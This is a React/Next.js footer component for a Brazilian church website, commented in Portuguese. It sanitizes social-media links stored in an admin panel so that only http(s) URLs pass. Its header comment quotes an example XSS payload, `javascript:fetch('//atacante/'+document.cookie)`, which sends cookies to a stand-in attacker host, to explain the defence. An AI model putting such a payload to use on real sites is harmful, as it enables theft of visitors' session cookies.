import Link from "next/link";
import type { CampusPublico, ConfigSite } from "@/lib/services/site";

/**
 * Rodapé do site.
 *
 * Os links de redes sociais vêm do banco (o cliente edita no painel). Eles
 * passam por `linkSeguro()` antes de virar `href`: sem isso, um valor como
 * `javascript:fetch('//atacante/'+document.cookie)` salvo no painel viraria
 * XSS em toda página do site.
 */

/** Só permite http(s). Qualquer outro esquema vira link morto. */
function linkSeguro(url: string | null | undefined): string | null {
  if (!url) return null;
  const v = url.trim();
  try {
    const u = new URL(v.startsWith("http") ? v : `https://${v}`);
    if (u.protocol !== "https:" && u.protocol !== "http:") return null;
    return u.toString();
  } catch {
    return null;
  }
}

/** Monta link de WhatsApp a partir dos dígitos, nunca de texto livre. */
function linkWhatsapp(numero: string | null): string | null {
  if (!numero) return null;
  const digitos = numero.replace(/\D/g, "");
  if (digitos.length < 10 || digitos.length > 13) return null;
  const comPais = digitos.startsWith("55") ? digitos : `55${digitos}`;
  return `https://wa.me/${comPais}`;
}

export function Rodape({
  config,
  campi,
  menu,
}: {
  config: ConfigSite;
  campi: CampusPublico[];
  menu: { rotulo: string; href: string }[];
}) {
  const ano = new Date().getFullYear();

  const redes = [
    { nome: "Instagram", url: linkSeguro(config.instagram) },
    { nome: "YouTube", url: linkSeguro(config.youtube) },
    { nome: "Facebook", url: linkSeguro(config.facebook) },
    { nome: "Spotify", url: linkSeguro(config.spotify) },
  ].filter((r): r is { nome: string; url: string } => r.url !== null);

  const whatsapp = linkWhatsapp(config.whatsapp);

  return (
    <footer className="site-footer">
      <div className="container container--wide">
        <div className="footer-grid">
          <div>
            <p className="brand__nome" style={{ fontSize: "1.4rem", marginBottom: ".8rem" }}>
              {config.nomeExibicao}
            </p>
            {config.tagline && (
              <p style={{ color: "var(--bone-dim)", fontSize: ".92rem", maxWidth: "34ch" }}>
                {config.tagline}
              </p>
            )}
            {redes.length > 0 && (
              <ul className="footer-lista" style={{ marginTop: "1.6rem", gridAutoFlow: "column", justifyContent: "start", gap: "1.2rem" }}>
                {redes.map((rede) => (
                  <li key={rede.nome}>
                    <a
                      href={rede.url}
                      target="_blank"
                      // noopener impede que a página aberta manipule esta via
                      // window.opener; noreferrer não vaza a URL de origem.
                      rel="noopener noreferrer"
                    >
                      {rede.nome}
                    </a>
                  </li>
                ))}
              </ul>
            )}
          </div>

          <div>
            <p className="footer-titulo">Navegação</p>
            <ul className="footer-lista">
              {menu.map((item) => (
                <li key={item.href}>
                  <Link href={item.href}>{item.rotulo}</Link>
                </li>
              ))}
            </ul>
          </div>

          <div>
            <p className="footer-titulo">Endereços</p>
            <ul className="footer-lista">
              {campi.map((campus) => (
                <li key={campus.id}>
                  <span style={{ color: "var(--bone-dim)", fontSize: ".9rem" }}>
                    <strong style={{ color: "var(--bone)", display: "block", fontWeight: 600 }}>
                      {campus.nome}
                    </strong>
                    {[campus.logradouro, campus.numero].filter(Boolean).join(", ")}
                    {campus.bairro && ` – ${campus.bairro}`}
                    {campus.cidade && `, ${campus.cidade}`}
                    {campus.uf && `/${campus.uf}`}
                  </span>
                </li>
              ))}
              {campi.length === 0 && (
                <li style={{ color: "var(--bone-faint)", fontSize: ".9rem" }}>Em breve</li>
              )}
            </ul>
          </div>

          <div>
            <p className="footer-titulo">Contato</p>
            <ul className="footer-lista">
              {config.telefoneContato && (
                <li>
                  <a href={`tel:${config.telefoneContato.replace(/\D/g, "")}`}>
                    {config.telefoneContato}
                  </a>
                </li>
              )}
              {whatsapp && (
                <li>
                  <a href={whatsapp} target="_blank" rel="noopener noreferrer">
                    WhatsApp
                  </a>
                </li>
              )}
              {config.emailContato && (
                <li>
                  {/* mailto: com valor validado como e-mail na gravação */}
                  <a href={`mailto:${config.emailContato}`}>{config.emailContato}</a>
                </li>
              )}
              <li>
                <Link href="/contato">Formulário de contato</Link>
              </li>
              <li>
                <Link href="/oracao">Pedido de oração</Link>
              </li>
            </ul>
          </div>
        </div>

        <div className="footer-base">
          <span>
            © {ano} {config.nomeExibicao}. Todos os direitos reservados.
          </span>
          <span style={{ display: "flex", gap: "1.2rem" }}>
            <Link href="/privacidade">Privacidade</Link>
            <Link href="/app">Aplicativo</Link>
            <Link href="/painel">Área restrita</Link>
          </span>
        </div>
      </div>
    </footer>
  );
}
